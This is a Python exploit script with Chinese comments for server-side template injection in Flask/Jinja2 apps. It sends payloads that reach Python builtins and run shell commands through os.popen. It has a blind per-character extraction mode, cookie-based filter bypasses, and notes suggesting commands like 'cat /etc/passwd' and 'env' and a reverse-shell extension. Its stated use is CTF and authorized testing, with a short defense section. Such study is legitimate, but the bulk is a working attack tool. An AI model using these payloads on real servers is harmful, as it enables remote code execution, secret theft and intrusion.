"""
SSTI (Server-Side Template Injection) 模板注入利用脚本

功能：利用 Flask/Jinja2 模板注入漏洞执行系统命令并获取输出
适用场景：CTF、授权渗透测试
"""

import requests


def ssti_blind_extraction(url, command, max_length=100):
    """
    使用盲注方式从 SSTI 漏洞中提取命令执行结果

    工作原理：
    1. 通过 SSTI 执行系统命令
    2. 逐字符比对输出结果
    3. 利用错误触发来判断字符是否匹配

    参数：
        url: 目标 URL
        command: 要执行的系统命令
        max_length: 输出的最大长度

    返回：
        命令执行结果
    """
    print(f"[*] 开始 SSTI 盲注提取...")
    print(f"[*] 目标 URL: {url}")
    print(f"[*] 执行命令: {command}\n")

    output = ''
    charset = "\x20abcdefghijklmnopqrstuvwxyz0123456789-{}_/."

    for i in range(0, max_length):
        found = False

        for j in charset:
            # 构造 SSTI payload
            # 逻辑：如果输出的第 i 个字符不等于 j，则触发不存在的函数导致错误
            payload = (
                "{%set a=(x|attr(request.cookies.x1)|attr(request.cookies.x2)|"
                "attr(request.cookies.x3))(request.cookies.x4)['ev'+'al']"
                "(request.cookies.x5)%}"
                "{% if a[" + str(i) + "]!='" + j + "' %}"
                "{{ (x|attr(request.cookies.x1)|attr(request.cookies.x2)|"
                "attr(request.cookies.x3))(request.cookies.x4)['ev'+'al']"
                "(request.cookies.x6) }}"
                "{% endif %}"
            )

            data = {"code": payload}

            # 通过 Cookie 传递敏感关键词，绕过过滤
            cookie = {
                "x1": "__init__",
                "x2": "__globals__",
                "x3": "__getitem__",
                "x4": "__builtins__",
                "x5": f"__import__('os').popen('{command}').read()",
                "x6": "__import__('os').qwer()"  # 不存在的函数，用于触发错误
            }

            try:
                r = requests.post(url, data=data, cookies=cookie, timeout=5)

                # 如果返回 "ok"，说明字符匹配成功
                if "ok" in r.text:
                    output += j
                    print(f"[+] 当前结果: {output}")
                    found = True
                    break

            except requests.RequestException as e:
                print(f"[!] 请求出错: {e}")
                continue

        # 如果没有找到匹配的字符，可能已经到达输出末尾
        if not found:
            break

    return output


def ssti_simple_test(url, command):
    """
    简单的 SSTI 测试（非盲注，直接返回结果）

    参数：
        url: 目标 URL
        command: 要执行的系统命令

    返回：
        命令执行结果
    """
    print(f"[*] 执行 SSTI 简单测试...")
    print(f"[*] 命令: {command}\n")

    payload = (
        "{{(x|attr('__init__')|attr('__globals__')|attr('__getitem__'))"
        "('__builtins__')['eval'](\"__import__('os').popen('" + command + "').read()\")}}"
    )

    data = {"code": payload}

    try:
        r = requests.post(url, data=data, timeout=5)
        print(f"[+] 响应内容:\n{r.text}\n")
        return r.text
    except requests.RequestException as e:
        print(f"[!] 请求失败: {e}")
        return None


if __name__ == "__main__":
    # 配置目标信息
    target_url = "http://example.com/"  # 替换为实际目标 URL

    print("=" * 60)
    print("SSTI 模板注入利用工具")
    print("=" * 60)

    # 模式选择
    print("\n[?] 选择模式:")
    print("  1. 盲注模式（逐字符提取，适用于过滤严格的环境）")
    print("  2. 简单测试模式（直接获取结果）")

    # 示例：使用盲注模式提取 flag
    print("\n[*] 使用盲注模式提取数据...\n")
    result = ssti_blind_extraction(
        url=target_url,
        command="cat /flag",  # 要执行的命令
        max_length=100
    )

    print("\n" + "=" * 60)
    print(f"[√] 提取完成！")
    print(f"[√] 结果: {result}")
    print("=" * 60)


"""
使用说明：
====================

1. 安装依赖：
   pip install requests

2. 基本用法：
   python 5_ssti_injection.py

3. SSTI 漏洞原理：
   - 服务端模板注入（SSTI）是指攻击者能够使用模板语法注入恶意代码
   - 常见于 Flask/Jinja2, Django, Tornado 等框架
   - 可以导致远程代码执行（RCE）

4. Payload 解析：

   核心技巧：通过 Cookie 传递关键词绕过过滤

   {{x|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')}}

   等价于：
   x.__init__.__globals__.__getitem__('__builtins__')

   最终可以访问到 Python 内置函数，执行任意代码

5. 盲注模式说明：
   - 逐字符猜测输出内容
   - 利用条件判断触发不同响应
   - 通过错误信息判断字符是否匹配
   - 适用于无法直接看到输出的场景

6. 字符集自定义：
   根据目标环境调整 charset 变量
   - 当前包含：空格、小写字母、数字、常见符号
   - 如果需要大写字母或其他字符，请添加到 charset

7. 常用命令：
   - 查看目录：ls / 或 dir
   - 读取文件：cat /flag 或 cat /etc/passwd
   - 查看环境变量：env
   - 查看当前路径：pwd

8. 绕过技巧：
   - 使用 attr() 过滤器代替点号
   - 使用字符串拼接绕过关键词过滤（'ev'+'al'）
   - 通过 Cookie 传递敏感参数
   - 使用 request 对象访问外部数据

9. 应用场景：
   - CTF Web 题目
   - 授权渗透测试
   - 漏洞研究学习

10. 注意事项：
    ⚠️  仅用于授权的渗透测试和 CTF 比赛
    ⚠️  未经授权的攻击行为是违法的
    - 根据实际环境调整 payload
    - 注意服务器响应，判断是否成功
    - 某些环境可能有 WAF 防护

11. 防御建议：
    - 避免直接将用户输入传递给模板引擎
    - 使用沙箱模式限制模板功能
    - 对用户输入进行严格过滤和验证
    - 及时更新框架版本

12. 扩展功能：
    可以修改脚本实现：
    - 文件上传
    - 反弹 shell
    - 更复杂的命令执行
    - 多线程加速盲注
"""
